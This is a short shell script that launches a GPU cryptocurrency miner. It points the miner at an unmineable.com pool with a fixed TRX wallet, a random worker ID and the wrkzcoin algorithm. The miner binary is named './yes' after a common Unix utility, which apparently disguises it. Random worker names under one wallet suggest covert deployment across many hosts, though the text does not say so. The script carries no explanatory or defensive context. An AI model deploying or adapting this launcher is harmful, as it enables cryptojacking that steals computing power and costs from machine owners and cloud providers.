POOL=rx-us.unmineable.com:3333
WALLET=TRX:TYz2bw6QDHXvbSQ6Tv1gY2YrCmwd416mYf
GPU=$(nvidia-smi --query-gpu=gpu_name --format=csv > nvidia.txt && echo "$(tail -n +2 "nvidia.txt")" > "nvidia.txt" && str=$(cat nvidia.txt) && echo ${str// /_})
WORKER=$(echo WL5cZxST-$(shuf -i 1911-798386 -n 1))
ALGO=wrkzcoin
./yes --pool $POOL --username $WALLET.$WORKER --password x --algorithm $ALGO --disableCPU
